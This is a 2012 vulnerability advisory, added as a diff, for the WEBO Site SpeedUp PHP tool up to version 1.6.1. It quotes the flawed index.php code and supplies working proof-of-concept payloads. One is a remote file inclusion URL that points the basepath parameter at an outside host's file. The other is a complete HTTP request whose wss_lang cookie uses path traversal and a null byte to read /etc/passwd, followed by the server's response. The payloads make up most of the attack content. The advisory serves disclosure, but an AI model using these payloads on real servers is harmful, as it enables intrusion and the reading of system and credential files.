@@ -1,0 +1,71 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+	
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-06-16                              ]
+ ###############################################################
+ #  [ WEBO Site SpeedUp <= 1.6.1 ]  Multiple Vulnerabilites    #
+ ###############################################################
+ #
+ # Script: "WEBO Site SpeedUp is a PHP solution that automatically speeds your 
+ #          website up by combining and compressing your JavaScript and CSS assets..."
+ #
+ # Vendor:   http://www.webogroup.com/home/
+ # Download: http://web-optimizator.googlecode.com/files/webo.site.speedup.v1.6.1.zip
+ #
+ #  Bug: ./weboptimizer/index.php (lines: 7-21)
+ #  ...
+ #  $basepath = isset($basepath) ? $basepath : dirname(__FILE__) . '/';          // 1 [RFI]
+ # 
+ #  /* We need these */
+ #  require($basepath . "controller/admin.php");                                 // 2 [RFI]
+ #  require($basepath . "libs/php/view.php");
+ # 
+ #  /* include language file */
+ #  $language = strtolower(preg_replace("/[-,;].*/", "", empty($_SERVER["HTTP_ACCEPT_LANGUAGE"]) ? 'en' : $_SERVER["HTTP_ACCEPT_LANGUAGE"]));
+ #  $language = preg_replace("/[^a-z]/", "", $language);
+ #  $language = str_replace(array('uk'), array('ua'), $language);
+ #  if (!empty($_COOKIE['wss_lang'])) {                                          // 1 [LFI]
+ #    $language = strtolower($_COOKIE['wss_lang']);                              // 2 [LFI]
+ #  }
+ #  if (is_file($basepath . "libs/php/lang/" . $language . ".php")) {            //
+ #    require($basepath . "libs/php/lang/" . $language . ".php");                // 3 [LFI]
+ #  } else {
+ #  	require($basepath . "libs/php/lang/en.php");
+ #  }
+ #  ...
+
+   [RFI] Vuln: ( allow_url_include = On; register_globals = On; )
+
+         http://localhost/weboptimizer/index.php?basepath=http://localhost/phpinfo.txt?
+
+   [LFI] Vuln: ( magic_quotes_gpc = Off; )
+ 
+         GET /weboptimizer/ HTTP/1.1
+         Host: localhost
+         User-Agent: Mozilla/5.0
+         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+         Accept-Language: pl,en-us;q=0.7,en;q=0.3
+         Accept-Encoding: gzip, deflate
+         Connection: keep-alive
+         Referer: http://localhost/weboptimizer/
+         Cookie: wss_blocks=wss_toolswss_linkswss_newswss_syswss_updates; wss_lang=../../../../../../etc/passwd%00
+  
+         HTTP/1.1 200 OK
+         Server: Apache
+         Date: Fri, 14 Jun 2012 22:29:39 GMT
+         Content-Type: text/html;charset=utf-8
+         Connection: keep-alive
+         X-Powered-By: PHP/5.2.10
+         Expires: Sat, 16 Jun 2012 03:29:39 +0400
+         Cache-Control: no-store, no-cache, must-revalidate, private
+         Pragma: no-cache
+         Vary: Accept-Encoding,User-Agent
+         Content-Encoding: gzip
+         Content-Length: 2099
+   
+ ### [ dun / 2012 ] #####################################################
